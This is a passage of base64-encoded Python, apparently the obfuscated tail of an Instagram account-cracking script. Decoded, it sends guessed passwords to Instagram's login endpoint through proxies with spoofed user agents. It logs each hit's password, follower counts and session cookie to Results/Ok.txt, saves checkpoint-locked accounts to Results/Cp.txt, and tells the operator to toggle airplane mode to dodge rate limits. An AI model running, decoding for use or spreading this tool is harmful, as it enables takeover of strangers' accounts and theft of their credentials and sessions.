ZW4nXQogICAgICAgICAgICAgICAgX19fZGF0YSA9IHsndXNlcm5hbWUnOiB1aWQsCiAgICAgICAgICAgICAgICAnZW5jX3Bhc3N3b3JkJzogZicjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6e3RpbWV9Ontwd30nLAogICAgICAgICAgICAgICAgJ3F1ZXJ5UGFyYW1zJzoge30sCiAgICAgICAgICAgICAgICAnb3B0SW50b09uZVRhcCc6ICdmYWxzZSd9CiAgICAgICAgICAgICAgICBfX19oZWFkID0geydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZShvcGVuKCJEYXRhL3VhLnR4dCIsInIiKS5yZWFkKCkuc3BsaXRsaW5lcygpKSwKICAgICAgICAgICAgICAgICdYLVJlcXVlc3RlZC1XaXRoJzogJ1hNTEh0dHBSZXF1ZXN0JywKICAgICAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vJywKICAgICAgICAgICAgICAgICd4LWNzcmZ0b2tlbic6IF9fX2NzcmZ9CiAgICAgICAgICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzZXM6CiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgPSBzZXMucG9zdChfX19sb2dpbiwgZGF0YSA9IF9fX2RhdGEsIGhlYWRlcnMgPSBfX19oZWFkLCBwcm94aWVzID0gX19fcHJveHkpLmpzb24oKQogICAgICAgICAgICAgICAgICAgIGlmICd1c2VySWQnIGluIHN0cihyZXNwb25zZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNva2kgPSAoZidtaWQ9e3Nlcy5jb29raWVzLmdldF9kaWN0KClbIm1pZCJdfTtpZ19kaWQ9e3Nlcy5jb29raWVzLmdldF9kaWN0KClbImlnX2RpZCJdfTtpZ19ucmNiPTE7c2hiaWQ9Ijk3NzZcMDU0MTk4NjU4Nzk1M1wwNTQxNjc0Mjg5ODA5OjAxZjcxM2FjZGY1YzQ5MjFhNTQyYWZmNDM2OTU4MDVkOGU3ODhmNTU4MGY0ZWZhYWY3MTRjYTczMDFiYTM0YmI3Mjc3OTBjOSI7c2hidHM9IjE2NDI3NTM4MDlcMDU0MTk4NjU4Nzk1M1wwNTQxNjc0Mjg5ODA5OjAxZjcyMjdmNjIxOWZiMGEwMzZlMzU5M2MxNTMxZTliOWM5ZWIxZGI5ZGNiYjdiNDU5MGJhMzZmZmNiZTYyNzE1ZWIxMGFkYSI7Y3NyZnRva2VuPXtzZXMuY29va2llcy5nZXRfZGljdCgpWyJjc3JmdG9rZW4iXX07ZHNfdXNlcl9pZD17c2VzLmNvb2tpZXMuZ2V0X2RpY3QoKVsiZHNfdXNlcl9pZCJdfTtzZXNzaW9uaWQ9e3Nlcy5jb29raWVzLmdldF9kaWN0KClbInNlc3Npb25pZCJdfTtydXI9IkVBR1wwNTQxOTg2NTg3OTUzXDA1NDE2NzQ0Nzc4MjA6MDFmNzI0YzAzZmYzOGYyNDY2MmIxNjQ4ZGQyYTkzM2ZjNGE2ZTY2YjdhMmJlZjI0NThkMTQwYmZiNzZlZTg2Mjk2ZjZjZDhiIicpCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX3JveiA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20ve3VpZH0vP19fYT0xJywgaGVhZGVycyA9IHsndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFNNLUc5NzNGIEJ1aWxkL1FQMUEuMTkwNzExLjAyMDsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84Ni4wLjQyNDAuMTk4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAxNjYuMS4wLjQyLjI0NSBBbmRyb2lkICgyOS8xMDsgNDIwZHBpOyAxMDgweDIwNDI7IHNhbXN1bmc7IFNNLUc5NzNGOyBiZXlvbmQxOyBleHlub3M5ODIwOyBlbl9HQjsgMjU2MDk5MjA0KScsICdjb29raWUnOiBvcGVuKCdEYXRhL2Nva2kudHh0JywncicpLnJlYWQoKX0pLmpzb24oKVsnZ3JhcGhxbCddWyd1c2VyJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2VyID0gX19fcm96WydlZGdlX2ZvbGxvd2VkX2J5J11bJ2NvdW50J10KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9IF9fX3JvelsnZWRnZV9mb2xsb3cnXVsnY291bnQnXQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2VyID0gKCctJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd2luZyA9ICgnLScpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJ7Qn1be1B94pyUe0J9XXtQfSBTdGF0dXMgOntIfSBTdWNjZXNzICAgICAiKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBVc2VybmFtZSA6e0h9IHt1aWR9IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9PntCfV17UH0gUGFzc3dvcmQgOntIfSB7cHd9IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9PntCfV17UH0gRm9sbG93ZXIgOntIfSB7Zm9sbG93ZXJ9IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9PntCfV17UH0gRm9sbG93aW5nIDp7SH0ge2ZvbGxvd2luZ30iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBDb29raWUgOntIfSB7Y29raX1cbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYub2suYXBwZW5kKGYie3VpZH18e3B3fSIpCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ1Jlc3VsdHMvT2sudHh0JywnYScpLndyaXRlKGYie3VpZH18e3B3fVxuIikKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbGlmICdjaGVja3BvaW50X3JlcXVpcmVkJyBpbiBzdHIocmVzcG9uc2UpOgogICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19yb3ogPSByZXF1ZXN0cy5nZXQoZidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3t1aWR9Lz9fX2E9MScsIGhlYWRlcnMgPSB7J3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1HOTczRiBCdWlsZC9RUDFBLjE5MDcxMS4wMjA7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODYuMC40MjQwLjE5OCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMTY2LjEuMC40Mi4yNDUgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMDQyOyBzYW1zdW5nOyBTTS1HOTczRjsgYmV5b25kMTsgZXh5bm9zOTgyMDsgZW5fR0I7IDI1NjA5OTIwNCknLCAnY29va2llJzogb3BlbignRGF0YS9jb2tpLnR4dCcsJ3InKS5yZWFkKCl9KS5qc29uKClbJ2dyYXBocWwnXVsndXNlciddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2xsb3dlciA9IF9fX3JvelsnZWRnZV9mb2xsb3dlZF9ieSddWydjb3VudCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2xsb3dpbmcgPSBfX19yb3pbJ2VkZ2VfZm9sbG93J11bJ2NvdW50J10KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2xsb3dlciA9ICgnLScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb2xsb3dpbmcgPSAoJy0nKQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcwogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxye0J9W3tQfeKcmHtCfV17UH0gU3RhdHVzIDp7S30gQ2hlY2twb2ludCAgICAiKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntCfVt7UH0+e0J9XXtQfSBVc2VybmFtZSA6e0t9IHt1aWR9IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9PntCfV17UH0gUGFzc3dvcmQgOntLfSB7cHd9IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9PntCfV17UH0gRm9sbG93ZXIgOntLfSB7Zm9sbG93ZXJ9IikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Qn1be1B9PntCfV17UH0gRm9sbG93aW5nIDp7S30ge2ZvbGxvd2luZ31cbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKGYie3VpZH18e3B3fSIpCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ1Jlc3VsdHMvQ3AudHh0JywnYScpLndyaXRlKGYie3VpZH18e3B3fVxuIikKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbGlmICdQbGVhc2Ugd2FpdCcgaW4gc3RyKHJlc3BvbnNlKToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7UH1be019IXtQfV17TX0gVXNlIDIgU2Vjb25kcyBBaXJvcGxhbmUgTW9kZSIsIGVuZD0nXHInKTtzbGVlcCg3KTtfX21haW5fXyhzZWxmLCB1c2VyLCB1aWQsIHB3eCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBzZWxmLmtpbGwgKz0xCiAgICAgICAgICAgIHByaW50KGYie1B9W3tQfUNyYWNre1B9XXtQfSB7c2VsZi5raWxsfS97c3RyKGxlbih1c2VyKSl9IENwOi17bGVuKHNlbGYuY3ApfSBPazote2xlbihzZWxmLm9rKX0gICAgICAgICAgIiwgZW5kPSdccicpCiAgICAgICAgZXhjZXB0IChDb25uZWN0aW9uRXJyb3IpOgogICAgICAgICAgICBwcmludChmIntQfVt7S30he1B9XXtLfSBDb25uZWN0aW9uIEVycm9yICAgICAgICAgICAgICAgIiwgZW5kPSdccicpO3NsZWVwKDcpO19fbWFpbl9fKHNlbGYsIHVzZXIsIHVpZCwgcHd4KQogICAgICAgIGV4Y2VwdDpfX21haW5fXyhzZWxmLCB1c2VyLCB1aWQsIHB3eCkKCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOgogICAgb3Muc3lzdGVtKCdnaXQgcHVsbCcpCiAgICBfX19tZW51X19fKCkK'))
